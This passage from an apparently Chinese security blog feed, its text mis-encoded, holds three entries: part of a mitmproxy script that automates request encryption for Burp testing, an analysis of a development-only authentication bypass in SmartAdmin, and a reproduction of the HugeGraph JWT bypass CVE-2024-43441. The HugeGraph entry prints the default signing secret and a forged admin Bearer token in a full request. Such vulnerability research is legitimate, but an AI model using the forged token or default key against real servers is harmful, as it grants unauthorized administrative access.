class="string">&#x27;time&#x27;</span>]</span><br><span class="line">        flow.request.headers[<span class="string">&#x27;requestId&#x27;</span>] = result[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        flow.request.headers[<span class="string">&#x27;sign&#x27;</span>] = result[<span class="string">&#x27;sign&#x27;</span>]</span><br><span class="line">        flow.request.content = result[<span class="string">&#x27;request&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        flow.request.headers[<span class="string">&#x27;Content-Length&#x27;</span>] = str(len(flow.request.content))</span><br><span class="line">        ctx.log.info(f<span class="string">&quot;åŠ å¯†åçš„è¯·æ±‚ä½“: &#123;flow.request.content&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        ctx.log.error(f<span class="string">&quot;Error in request: &#123;str(e)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">response</span><span class="params">(flow)</span>:</span><br><span class="line">    response_body = flow.response.content</span><br><span class="line">    ctx.log.info(f<span class="string">&quot;å“åº”ä½“: &#123;response_body&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = get_responseRpc(response_body)</span><br><span class="line">    <span class="keyword">if</span> result is None:</span><br><span class="line">        ctx.log.error(<span class="string">&quot;Response RPC failed, keeping original response&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        # å°†è§£ç åçš„å­—å…¸è½¬ä¸º JSON å­—ç¬¦ä¸²å¹¶ç¼–ç ä¸ºå­—èŠ‚</span><br><span class="line">        decoded_json = json.dumps(result, ensure_ascii=False).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        flow.response.content = decoded_json</span><br><span class="line">        flow.response.headers[<span class="string">&#x27;Content-Length&#x27;</span>] = str(len(flow.response.content))</span><br><span class="line">        # å¯é€‰ï¼šè®¾ç½® Content-Type ä¸º JSON</span><br><span class="line">        flow.response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/json; charset=utf-8&#x27;</span></span><br><span class="line">        ctx.log.info(f<span class="string">&quot;è§£ç åçš„å“åº”ä½“: &#123;flow.response.content&#125;&quot;</span>)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        ctx.log.error(f<span class="string">&quot;Error in response: &#123;str(e)&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åè®¾ç½®burpçš„ä¸Šæ¸¸ä»£ç†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105616107.png" alt="image.png"></p><p>è¿è¡Œè„šæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmdump -p <span class="number">8081</span> -s .\JsPython.py </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105619808.png" alt="image.png"></p><p>è¿™æ ·å³å¯å®ç°è‡ªåŠ¨åŒ–åŠ è§£å¯†</p><p>å½“å¯†ç ä¸æ­£ç¡®æ—¶</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105624103.png" alt="image.png"></p><p>å½“å¯†ç æ­£ç¡®æ—¶ï¼Œè¿™é‡Œè¯·æ±‚å¤´ä¸­çš„ä¸‰ä¸ªå€¼åœ¨burpè™½ç„¶æ²¡å˜ä½†å®é™…ä¸Šæ˜¯å·²ç»æ”¹å˜äº†çš„ï¼Œå› ä¸ºæ˜¯åœ¨è„šæœ¬ä¸­åšçš„å¤„ç†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250310105628138.png" alt="image.png"></p><p>è¿˜æ˜¯éå¸¸æ–¹ä¾¿æ»´ï¼Œå› ä¸ºä¸éœ€è¦å»é€†jsäº†</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/news/14689">https://xz.aliyun.com/news/14689</a></p><p><a href="https://xz.aliyun.com/news/12678">https://xz.aliyun.com/news/12678</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SmartAdmin-3.13.0-â€å‡â€æƒé™ç»•è¿‡</title>
      <link href="/2025/03/SmartAdmin-3-13-0-%E2%80%9D%E5%81%87%E2%80%9D%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
      <url>/2025/03/SmartAdmin-3-13-0-%E2%80%9D%E5%81%87%E2%80%9D%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/news/17175">https://xz.aliyun.com/news/17175</a></strong></p></blockquote><p>ä¸ºä»€ä¹ˆè¯´æ˜¯å‡å‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªâ€æƒé™ç»•è¿‡â€œåªæ˜¯æ–¹ä¾¿å¼€å‘æµ‹è¯•ï¼Œæ¯•ç«Ÿåº”è¯¥æ²¡äººä¼šæŠŠå¼€å‘ç¯å¢ƒç›´æ¥æ”¾åˆ°å…¬ç½‘å§</p><h2 id="é¡¹ç›®åœ°å€"><a href="#é¡¹ç›®åœ°å€" class="headerlink" title="é¡¹ç›®åœ°å€"></a>é¡¹ç›®åœ°å€</h2><p><a href="https://github.com/1024-lab/smart-admin">Releases Â· 1024-lab&#x2F;smart-admin</a></p><p><a href="https://gitee.com/lab1024/smart-admin/">https://gitee.com/lab1024/smart-admin/</a></p><h2 id="æ¼æ´åˆ†æï¼ˆæƒé™ç»•è¿‡ï¼‰"><a href="#æ¼æ´åˆ†æï¼ˆæƒé™ç»•è¿‡ï¼‰" class="headerlink" title="æ¼æ´åˆ†æï¼ˆæƒé™ç»•è¿‡ï¼‰"></a>æ¼æ´åˆ†æï¼ˆæƒé™ç»•è¿‡ï¼‰</h2><p>é¦–å…ˆçœ‹äº†çœ‹é¡¹ç›®çš„ä¾èµ–ï¼ŒåŸºæœ¬ä¸Šæ²¡å¾—æï¼Œfastjsonä¸º2ï¼Œçœ‹ä¸€ä¸‹æ‹¦æˆªå™¨åœ¨<code>MvcConfig</code> ä¸‹æ³¨å†Œæ·»åŠ äº†<br><code>AdminInterceptor</code> ä¸ºæ‹¦æˆªå™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">    registry.addInterceptor(adminInterceptor)</span><br><span class="line">            .excludePathPatterns(SwaggerConfig.SWAGGER_WHITELIST)</span><br><span class="line">            .addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>excludePathPatterns</code> æ–¹æ³•ä¸ºä¸éœ€è¦æ‹¦æˆªçš„è·¯å¾„ï¼Œå³SWAGGER_WHITELISTä¸­çš„å†…å®¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] SWAGGER_WHITELIST = &#123;</span><br><span class="line">        <span class="string">&quot;/swagger-ui/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/swagger-ui/index.html&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/swagger-ui.html&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/swagger-ui.html/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/v3/api-docs&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/v3/api-docs/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/doc.html&quot;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥è¡¨ç¤ºè¿™äº›è·¯å¾„ä¸éœ€è¦ç™»å½•å³å¯è®¿é—®ï¼Œ<code>addPathPatterns</code> ä¸ºéœ€è¦æ‹¦æˆªçš„ï¼Œè¿™é‡Œç”¨çš„é€šé…ç¬¦è¡¨ç¤ºé™¤ä¸Šé¢æ‰€æœ‰çš„æ¥å£éƒ½éœ€è¦ç»è¿‡æ‹¦æˆªå™¨ï¼Œé‚£ä¹ˆå¦‚æœæ‹¦æˆªå™¨ä¸­æƒé™æ ¡éªŒå†™çš„æœ‰é—®é¢˜å°±ä¼šå‡ºç°æƒé™ç»•è¿‡çš„é—®é¢˜ï¼Œä¸‹é¢æ¥çœ‹çœ‹æ‹¦æˆªå™¨<code>AdminInterceptor</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --------------- ç¬¬ä¸€æ­¥ï¼š æ ¹æ®token è·å–ç”¨æˆ· ---------------</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">tokenValue</span> <span class="operator">=</span> StpUtil.getTokenValue();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">debugNumberTokenFlag</span> <span class="operator">=</span> isDevDebugNumberToken(tokenValue);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (debugNumberTokenFlag) &#123;</span><br><span class="line">    <span class="comment">//å¼€å‘ã€æµ‹è¯•ç¯å¢ƒï¼Œä¸”ä¸ºæ•°å­—çš„è¯ï¼Œåˆ™è¡¨æ˜ä¸º è°ƒè¯•ä¸´æ—¶ç”¨æˆ·ï¼Œå³éœ€è¦è°ƒç”¨ sa-token switch</span></span><br><span class="line">    loginId = UserTypeEnum.ADMIN_EMPLOYEE.getValue() + StringConst.COLON + tokenValue;</span><br><span class="line">    StpUtil.switchTo(loginId);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loginId = (String) StpUtil.getLoginIdByToken(tokenValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">RequestEmployee</span> <span class="variable">requestEmployee</span> <span class="operator">=</span> loginService.getLoginEmployee(loginId, request);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è·å–tokenï¼Œ<code>StpUtil.getTokenValue()</code> ä¸ºsa-tokenä¾èµ–çš„åŸç”Ÿæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134254326.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè·å–çš„tokennameä¸ºx-access-tokenï¼Œå³ä»é…ç½®æ–‡ä»¶ä¸­è·å–å®šä¹‰çš„tokenå</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134300835.png" alt="image.png"></p><p>è·å–å®Œä¹‹åç»è¿‡<code>isDevDebugNumberToken</code> æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134306931.png" alt="image.png"></p><p>æ£€æŸ¥æ˜¯å¦æ˜¯æ•°å­—æˆ–è€…ä¸ºnullï¼Œè¿™é‡Œä¸»è¦å…³æ³¨ä¸ºæ•°å­—çš„æƒ…å†µ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134312336.png" alt="image.png"></p><p>æ˜¯æ•°å­—å°±ä¼šæ£€æµ‹æ˜¯å¼€å‘ç¯å¢ƒè¿˜æ˜¯æµ‹è¯•ç¯å¢ƒï¼Œä»»æ„ä¸€ä¸ªéƒ½ä¼šè¿”å›trueï¼Œè¿™æ ·å³è¿›å…¥åé¢çš„ifä¸­</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134317887.png" alt="image.png"></p><p>æ­¤æ—¶<code>loginId</code>å°±ä¼šå˜ä¸º<code>1:123</code> çš„å½¢å¼ï¼Œ123å³æˆ‘ä»¬ä¼ å…¥çš„tokenï¼Œ1å³adminæƒé™id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ((HandlerMethod) handler).getMethod();</span><br><span class="line"><span class="type">NoNeedLogin</span> <span class="variable">noNeedLogin</span> <span class="operator">=</span> ((HandlerMethod) handler).getMethodAnnotation(NoNeedLogin.class);</span><br><span class="line"><span class="keyword">if</span> (noNeedLogin != <span class="literal">null</span>) &#123;</span><br><span class="line">    checkActiveTimeout(requestEmployee, debugNumberTokenFlag);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç»­å°±æ˜¯åˆ¤æ–­ä½ æ‰€è®¿é—®çš„controlleræ˜¯å¦æœ‰æ— éœ€ç™»å½•çš„æ³¨è§£ï¼Œè¿™é‡Œæœ‰å…³é”®çš„ä¸€è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestEmployee</span> <span class="variable">requestEmployee</span> <span class="operator">=</span> loginService.getLoginEmployee(loginId, request);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>requestEmployee</code>  æœ€ç»ˆçš„ç»“æœå¿…é¡»ä¸ä¸ºnullå¦åˆ™å°±ä¼šå‡ºç°æœªç™»å½•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134329015.png" alt="image.png"></p><p>é‚£ä¹ˆå°±è·Ÿè¿›çœ‹çœ‹å¤„ç†é€»è¾‘</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134334462.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¿…é¡»ä¸ºå­˜åœ¨çš„ç”¨æˆ·ï¼Œè€Œä¸”åé¢è¿˜æœ‰æƒé™æ ¡éªŒï¼Œå…ˆçœ‹ä¸€ä¸‹æœ¬åœ°æ•°æ®åº“ï¼Œç›´æ¥èƒ½å¾—åˆ°ç®¡ç†å‘˜idå°±æ˜¯1</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134340595.png" alt="image.png"></p><p>åé¢ä»ä»£ç å¯ä»¥çœ‹åˆ°è¶…ç®¡æ— éœ€æƒé™æ ¡éªŒ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134344584.png" alt="image.png"></p><p>è€Œè¿™ä¸ªadminå³ä¸ºè¶…ç®¡ï¼Œidä¸º1å³å¯ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134350709.png" alt="image.png"></p><h2 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h2><p>éšä¾¿æ‹¿ä¸ªæ¥å£éªŒè¯å³å¯<code>/goods/exportGoods</code></p><p>å½“<code>x-access-token</code>æ— å€¼çš„æƒ…å†µ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134356060.png" alt="image.png"></p><p>å½“ä¸ä¸ºè¶…ç®¡çš„æƒ…å†µ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134400716.png" alt="image.png"></p><p>ä¸ºè¶…ç®¡çš„æƒ…å†µ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134405869.png" alt="image.png"></p><p>åˆ†æå®Œå…¶å®è¿™ä¸ªåªèƒ½ç®—æ–¹ä¾¿å¼€å‘ç¯å¢ƒæµ‹è¯•ï¼Œç”Ÿäº§ç¯å¢ƒ<code>debugNumberTokenFlag</code> è¿”å›çš„ä¹Ÿæ˜¯false</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250307134410367.png" alt="image.png"></p><p>æ‰€ä»¥åªèƒ½ç®—æ˜¯å­¦ä¹ å§</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://mp.weixin.qq.com/s/5FFh9-4pIzIXh9OJNz_blg">https://mp.weixin.qq.com/s/5FFh9-4pIzIXh9OJNz_blg</a> </p><p>æ·±æƒ…å“¥è¿˜æ˜¯ç‰›çš„ï¼Œä¸€å¼€å§‹æ²¡ä»”ç»†çœ‹éƒ½æ²¡å‘ç°è¿™ä¸ªæƒé™ç»•è¿‡</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ApacheÂ HugeGraph-Server JWT æƒé™ç»•è¿‡</title>
      <link href="/2025/03/Apache-HugeGraph-Server-JWT-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
      <url>/2025/03/Apache-HugeGraph-Server-JWT-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>çœ‹åˆ°pç¥çš„vulhubç¯å¢ƒæ›´æ–°äº†ï¼Œæ­£å¥½æ˜¯ä¸ªæƒé™ç»•è¿‡ï¼Œå¯¹è¿™å—ä¸å¤ªç†Ÿå¤ç°ä¸€æ‰‹</p><h2 id="å½±å“ç‰ˆæœ¬åŠç¼–å·"><a href="#å½±å“ç‰ˆæœ¬åŠç¼–å·" class="headerlink" title="å½±å“ç‰ˆæœ¬åŠç¼–å·"></a>å½±å“ç‰ˆæœ¬åŠç¼–å·</h2><p>Affected versionsï¼š&gt;&#x3D; 1.0.0, &lt; 1.5.0</p><p>CVE-2024-43441</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ—¢ç„¶æ˜¯æƒé™ç»•è¿‡ï¼Œé‚£ä¹ˆå°±å¾—åˆ†æé‰´æƒï¼Œç›´æ¥æ‰¾loginï¼Œåœ¨hugegraph-serverä¸‹çš„hugegraph-apiæ‰¾åˆ°ç™»å½•æ¥å£<code>src/main/java/org/apache/hugegraph/api/auth/LoginAPI.java</code> ä½†æ˜¯å¥‡æ€ªçš„æ˜¯æ— æ³•èµ°è¿›è¿™é‡Œç”Ÿæˆtokençš„é€»è¾‘ï¼Œç›´æ¥å°±è¿›å…¥äº†<code>AuthenticationFilter#filter</code> ä¸­è¿›è¡Œtokençš„æ ¡éªŒäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥å…ˆçœ‹ä¸€ä¸‹æ ¡éªŒï¼Œè¿›å…¥<code>authenticate</code> æ–¹æ³•ï¼Œå½“è®¾ç½®å¥½jwtæ ¼å¼çš„è¯·æ±‚å¤´åå°±ä¼šèµ°åˆ°ä¸‹é¢çš„jwtæ ¡éªŒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer ...</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214845027.png" alt="image.png"></p><p>ç»§ç»­è·Ÿè¿›æ¥åˆ°ä¸‹é¢çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HugeAuthenticator.User <span class="title function_">authenticate</span><span class="params">(Map&lt;String, String&gt; credentials)</span></span><br><span class="line">        <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.authenticator().authenticate(credentials);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214850092.png" alt="image.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214713552.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œè¿›è¡Œäº†tokençš„æ ¡éªŒï¼Œç”±äºæˆ‘æ­¤æ—¶è®¾ç½®çš„æ˜¯é”™è¯¯çš„jwtï¼Œæ‰€ä»¥å°±ä¼šæ ¡éªŒå¤±è´¥</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214804932.png" alt="image.png"></p><p>ç„¶åå¯»æ‰¾jwtçš„æ„é€ ï¼Œæ¥åˆ°LoginAPIä¸‹ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†ä¸€ä¸ªæ­£ç¡®çš„jwtï¼Œä¸ç„¶æ²¡æ³•æ–­åœ¨è¿™é‡Œï¼Œå‰é¢å°±ä¼šæŠ¥é”™ä¸æ­£ç¡®çš„ç”¨æˆ·å¯†ç å•¥çš„</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214753491.png" alt="image.png"></p><p>è·Ÿè¿›æ¥åˆ°ä¸‹é¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">loginUser</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.authManager.loginUser(username, password);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotAuthorizedException</span>(e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214859160.png" alt="image.png"></p><p>ç„¶åå‘ç°jwtçš„æ„é€ ï¼Œä¸€ä¸ªpayloadï¼Œä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œjwté»˜è®¤è¿‡æœŸæ—¶é—´å‚æ•°ä¸ºexp</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214909180.png" alt="image.png"></p><p>è€Œpayloadåˆ†åˆ«æ˜¯<code>*TOKEN_USER_NAME</code>* å’Œ<code>*TOKEN_USER_ID*</code> çœ‹çœ‹è¿™ä¸¤ä¸ªå¸¸é‡çš„å®šä¹‰</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214913281.png" alt="image.png"></p><p>æ‰€ä»¥æ„é€ payloadçš„æ—¶å€™éœ€è¦åŠ å…¥è¿™ä¸¤ä¸ªï¼Œç„¶åè·Ÿè¿›<code>create</code>å‡½æ•°çœ‹çœ‹ï¼Œå‘ç°è¿˜éœ€è¦ä¸€ä¸ªkey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">create</span><span class="params">(Map&lt;String, ?&gt; payload, <span class="type">long</span> expire)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">               .setClaims(payload)</span><br><span class="line">               .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + expire))</span><br><span class="line">               .signWith(<span class="built_in">this</span>.key, SignatureAlgorithm.HS256)</span><br><span class="line">               .compact();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªkeyæœ‰é»˜è®¤çš„ï¼Œè¿™ä¹Ÿæ˜¯èƒ½ä¼ªé€ jwtçš„ä¸€ä¸ªå…³é”®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ConfigOption&lt;String&gt; AUTH_TOKEN_SECRET =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConfigOption</span>&lt;&gt;(</span><br><span class="line">                <span class="string">&quot;auth.token_secret&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Secret key of HS256 algorithm.&quot;</span>,</span><br><span class="line">                disallowEmpty(),</span><br><span class="line">                <span class="string">&quot;FXQXbJtbCLxODc6tGci732pkH1cyf8Qg&quot;</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>å…ˆç”Ÿæˆä¸€ä¸ªæ—¶é—´æˆ³</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214920199.png" alt="image.png"></p><p>ç„¶åæ„é€ jwt</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      <span class="string">&quot;user_name&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">      <span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">      <span class="string">&quot;exp&quot;</span>: <span class="number">1740310428</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214924848.png" alt="image.png"></p><p>åˆ©ç”¨è¿™ä¸ªtokenè®¿é—®éœ€è¦æƒé™æ ¡éªŒçš„æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /graphs HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.188</span><span class="number">.129</span>:<span class="number">8080</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span>,en-GB;q=<span class="number">0.7</span>,en-US;q=<span class="number">0.6</span>,ca;q=<span class="number">0.5</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">132.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span> Edg/<span class="number">132.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiJhZG1pbiIsImV4cCI6MTc0MDMxMDQyOH0.CGGXx45be_ddqJV0vEFyk81TxOc8yqLJaOCieNqseG4</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214931145.png" alt="image.png"></p><p>æ²¡æœ‰æ­£ç¡®çš„tokenæ—¶</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/20250306214936009.png" alt="image.png"></p><p>æœŸé—´å«å­¦å¼Ÿä¹Ÿå¤ç°äº†ä¸€ä¸‹ï¼ŒæŒºç‰›æ¯”æˆ‘å‰å®³å“ˆå“ˆå“ˆ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246">https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246</a></p><p><a 